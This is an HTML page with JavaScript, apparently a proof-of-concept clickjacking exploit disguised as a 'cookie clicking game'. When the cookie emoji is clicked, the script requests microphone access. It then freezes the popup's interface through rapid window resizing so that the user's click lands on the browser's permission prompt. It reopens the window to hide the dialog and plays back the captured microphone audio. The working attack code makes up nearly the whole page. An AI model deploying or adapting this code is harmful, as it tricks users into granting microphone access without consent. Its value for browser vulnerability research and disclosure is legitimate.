<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Cookie game!</title>
</head>
<body>
  <h1>Wow!</h1>
  <p>Click this cookie to win -> <b id="cookie" style="cursor:default; display:inline-block; margin-right:40px;">🍪</b> </p>
<script>
// Attack params
const waitBefore = 4;
const waitPerResize = 6;
const waitFreeze = 800;
const clickable = document.getElementById("cookie");

let targetTime = 0;

function openTarget(){
  window.open("bangga.html", "target", "popup");
}

if (window.name !== "target") {
  /* Main window */
  document.body.innerHTML = `
    <h1>Play our cool new cookie clicking game!</h1>
    <button onClick="openTarget()">Click to play!</button>
  `;
} else if (!document.cookie.includes("success=true")) {
  /* Game window */
  window.resizeTo(286,256);
  window.moveBy(-12, -12);
} else {
  /* Success window */
  targetTime = 1;
  document.cookie = "success=";
  navigator.mediaDevices.getUserMedia({"audio": true}).then((stream)=>{
    const audioContext = new AudioContext();
    const microphone = audioContext.createMediaStreamSource(stream);
    const destination = audioContext.destination;
    microphone.connect(destination);
    document.body.appendChild(document.createTextNode("Playing back microphone audio..."));
  });
}

function currentTimeMillis(){
  return parseFloat(new Date().getTime())
}


function waitFor(){
  setTimeout(()=>{
    if (targetTime < currentTimeMillis()) return;
    waitFor()
    window.resizeBy(10, 10)
    window.resizeBy(-10, -10)
  }, waitPerResize);
}

clickable.addEventListener("click", (e) => {
  // Only activate once
  if (targetTime !== 0) return;

  // Wait 8ms and freeze UI for ~1 second
  targetTime = currentTimeMillis() + waitFreeze;
  setTimeout(()=>waitFor(), waitBefore)

  // Ask for microphone
  navigator.mediaDevices.getUserMedia({"audio": true}).then((stream)=>{
    // If microphone received, reopen the page to hide permission dialog
    targetTime = 2;
    document.cookie = "success=true";
    openTarget();
  });
});
</script>
</body>
</html>
